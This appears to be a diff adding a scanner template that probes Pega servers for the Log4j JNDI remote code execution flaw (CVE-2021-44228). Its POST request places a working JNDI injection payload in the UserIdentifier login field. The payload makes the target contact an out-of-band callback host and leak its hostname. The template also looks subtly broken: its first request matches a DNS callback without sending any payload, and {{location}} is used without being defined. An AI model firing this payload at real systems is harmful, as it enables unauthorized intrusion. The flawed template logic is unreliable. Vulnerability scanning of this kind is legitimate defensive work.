@@ -1,0 +1,43 @@
+id: pega-log4j-rce
+brief:
+    title: Pega - Remote Code Execution (Apache Log4j)
+    by: shaikhyaser
+    level: critical
+    about: Pega is susceptible to Log4j JNDI remote code execution. Pega provides a powerful low-code platform that empowers the world's leading enterprises to Build for Change.
+    label:
+        - cve
+        - cve2021
+        - rce
+        - jndi
+        - log4j
+        - pega
+        - oast
+        - kev
+        - vuln
+    score: CVE-2021-44228 CVSS:10.0
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/prweb/'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      signs:
+        - "on": word
+          has:
+            - dns
+          in: interactsh_protocol
+          need: all
+    - verb: POST
+      to:
+        - '{{BaseURL}}{{location}}'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+        Origin: '{{RootURL}}'
+        Referer: '{{location}}'
+      body: pzAuth=guest&UserIdentifier=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}&Password=a&pyActivity%3DCode-Security.Login=&lockScreenID=&lockScreenPassword=&newPassword=&confirmNewPassword=
+      signs:
+        - "on": word
+          has:
+            - dns
+          in: interactsh_protocol
+          need: all
